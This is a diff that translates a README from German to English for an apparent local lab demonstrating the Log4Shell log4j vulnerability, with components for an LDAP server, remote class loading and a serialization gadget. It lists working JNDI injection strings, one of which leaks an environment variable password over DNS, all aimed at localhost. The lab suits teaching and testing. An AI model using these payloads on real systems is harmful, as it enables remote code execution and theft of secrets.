@@ -1,37 +1,36 @@
-# Übersicht
+# Overview
 
-Die Komponenten sind:
+The components are:
 
-- log4shell: Loggt eine Logzeile mit log4j.
-- ldap: Ein simpler LDAP-Server.
-- remote: Der Exploit, der für remote Classloading verwendet wird.
-- serialization: Der Exploit, der ein serialisiertes Objekt für den Exploit erstellt.
-  - Um dies Auszunutzen muss z.B: `commons-collections:commons-collections:3.1` im Classpath sein.
-- serve_exploit.sh: Kompiliert das remote-Projekt und startet einen Server, der das Classfile ausliefert.
-- listen_to_udp.sh: Öffnet ein UDP-Port und gibt eine Antwort.
-- jndi: Ein Beispiel für den Exploit, der nur JNDI verwendet.
+- `log4shell`: Logs a logline using `log4j`.
+- `ldap`: A simple LDAP server.
+- `remote`: The code of the exploit that is used during the remote class loading.
+- `serialization`: Creates a serialized object of the exploit.
+  - To use this e.g. `commons-collections:commons-collections:3.1` has to be on the classpath.
+- `serve_exploit.sh`: Compiles the `remote`-project and starts a server that serves the class-file.
+- `listen_to_udp.sh`: Opens a UDP port and responds.
+- `jndi`: Example the the exploit that only uses JNDI.
 
-In `build.gradle` von `log4shell` wird `Dcom.sun.jndi.ldap.object.trustURLCodebase=true` gesetzt, damit
-der Remote-Classloading Teil funktioniert. Es ist natürlich interessant die Beispiele einfach mal ohne diesen
-Parameter durchzuspielen.
+In `build.gradle` of `log4shell` the value `Dcom.sun.jndi.ldap.object.trustURLCodebase=true` is set, so that
+the part using remote classloading works. It certainly also is intertesting to try these examples without this parameter.
 
-#  Vorbereitung
+#  Preparation
 
-- `gradle ldap:run`, um den LDAP-Server zu starten.
-- `./serve_exploit.sh`, um den Exploit zu kompilieren und den Server zu starten, der den Code ausliefert.
-- `./listen_to_udp.py`, um Daten auf UDP Port 1053 anzunehmen.
+- `gradle ldap:run`, to start the LDAP server.
+- `./serve_exploit.sh`, to compiole the exploit and start the server that serves the code.
+- `./listen_to_udp.py`, to accept data on UDP port 1053.
 
-# Testen des Exploits
+# Testing the Exploits
 
-Rufe
+Call
 
 ```
 gradle log4shell:run --args="<logstring>" 
 ```
 
-mit den folgenden Werten für `logstring` auf:
+with the following values for `logstring`:
 
-- `\${jndi:ldap://127.0.0.1:1389/dc=javaNamingReference}` für den Remote Code Exploit.
-- `\${jndi:ldap://127.0.0.1:1389/dc=javaSerializedData}` für den Exploit, der Klassen im Classpath verwendet.
-- `\${jndi:dns://127.0.0.1:1053/\${env:MY_PASSWORD}}` um Daten via DNS zu übertragen. Dabei sollte `MY_PASSWORD` vorher
-  entsprechend gesetzt werden.
+- `\${jndi:ldap://127.0.0.1:1389/dc=javaNamingReference}` for the remote code exploit.
+- `\${jndi:ldap://127.0.0.1:1389/dc=javaSerializedData}` for the exploit that uses classes in the classpath.
+- `\${jndi:dns://127.0.0.1:1053/\${env:MY_PASSWORD}}` to transfer data via DNS. For this `MY_PASSWORD` should
+  be set accordingly in advance.
